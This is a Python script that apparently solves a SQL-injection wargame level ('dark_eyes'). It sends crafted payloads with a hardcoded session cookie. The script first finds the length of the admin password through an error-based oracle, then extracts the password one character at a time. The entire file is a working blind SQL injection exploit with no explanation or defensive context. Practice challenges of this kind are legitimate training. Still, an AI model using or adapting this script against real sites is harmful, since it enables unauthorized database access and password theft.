#!/usr/bin/python
# -*- coding : UTF-8 -*-

import requests
import string

# url encoding
def urlQuery(url):
    url = url.replace("#", "%23")
    url = url.replace(" ", "%20")
    url = url.replace("'", "%27")
    url = url.replace("&", "%26%26")
    url = url.replace(">", "%3E")
    url = url.replace("<", "%3C")

    return url

cookies = dict(PHPSESSID="8nprcactb6uekd9ocb96q3fh17")
url = "http://los.eagle-jump.org/dark_eyes_a7f01583a2ab681dc71e5fd3a40c0bd4.php"


abc = string.ascii_letters + string.digits + "!@#$%^&*()_-{}[];:><,./?"

# select * from test where id='admin' and pw='' or ord(id)=97 and (length(pw)=0 or (select 1 union select pw))



# pw length config
print("[+] pw length config \n")
for i in range(0, 100):
    payload = "?pw=' OR ord(id)=97 and (length(pw)=" + str(i) + " or (select 1 union select pw))#"
    payload = urlQuery(payload)
    r = requests.get(url+payload, cookies=cookies)

    if len(r.text) < 5:
        print("[-] Err0r was f0und. - the length of the 'pw' is not " + str(i))
    else :
        print("[*] the length of 'pw' is " + str(i))
        length = i
        break

result = ""
print("\n\n=====================\n\nblind sqli start\n")
for i in range(1, (length+1)):
    for a in abc:
        payload = "?pw=' OR ord(id)=97 AND (ord(mid(pw,"+str(i)+",1))="+str(ord(a))+\
                  " or (select 1 union select pw))%23"

        r = requests.get(url+payload, cookies=cookies)

        if len(r.text) < 5:
            print("[-] Err0r was f0und. (%d, %c)" %(i, a))
        else:
            print("[*] the %d pw is %c" % (i, a))
            result += a
            break

print("[=] the result : " + result)
